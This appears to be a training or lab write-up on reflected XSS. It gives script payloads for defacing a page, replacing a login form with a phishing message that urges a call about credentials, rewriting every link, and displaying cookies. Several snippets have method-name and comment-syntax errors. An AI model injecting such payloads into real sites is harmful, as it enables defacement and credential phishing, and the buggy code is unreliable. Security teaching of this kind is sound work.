<--Reflected XSS Attack Example-->
<script>

        let message = "This site has beend HACKED please fix your XSS issue!"
        document.getElementByTagName("h1")[0].innerHTML = message

</script>


<--Social Engineering Attack Example-->
<--Our Code needs to do three things: define a social engineering message, place it on the page
, and remove the initial form components(input box and button). Line 20 and 21 create a new h2
element and set the text of the header to be our social engineering message! Line 24 is used
to add our h2 element to the page. It walks the document object model until it findes the 
parentNode of the form. Line 11 is used to remove the form components by removing the entire
form itself. Again navigating the document model, we arrive at the parent nnode of the form. 
Issuing a call to the removeChild method and scecifying the form, we can remove it from
the document - leaving only our h2 element and message-->
<script>

    // Setup our social engineering message
    let socialMessage = document.createElement("h2");
    socialMessage.InnerHTML = "Website is down - Call the help desk at xxx-xxx-xxxx to reset your username and password!";
    
    // Add the message to the page
    document.forms[0].parentNode.appendChild(socialMessage);

    // Remove login form
    document.forms[0].removeChild(document.forms[0]);

</script>


<--Tempering with Links-->
<--To meet the test object, we'll need to find a way to cycle through each one of the
anchor elements on the page, changing their text content as well as the URL reference
To do this, we'll first establish an anchors variable. Anchors will then be populated
with a list of all "a" elements on the page. This list is returned by calling the 
getElementsByTagName and passing it the "a" Tag! Once we have the list of anchor tags,
we'll feed them through the for loop seen on line 46. For each item in the list, we'll 
adjust the href pointer as well as innerHTML attribute -->
<script>

    let anchors = document.getElementByTagName("a");

    for(i=0; i < anchors.length; i++) {
        anchors[i].href= "http://www.google.com";
        anchors[i].innerHTML = "Modified"
    }

</script>


<--Disclosing Cookie Contents-->
<--Simple one-liner to display the site's cookie-->
<script>alert(document.cookie);</script>
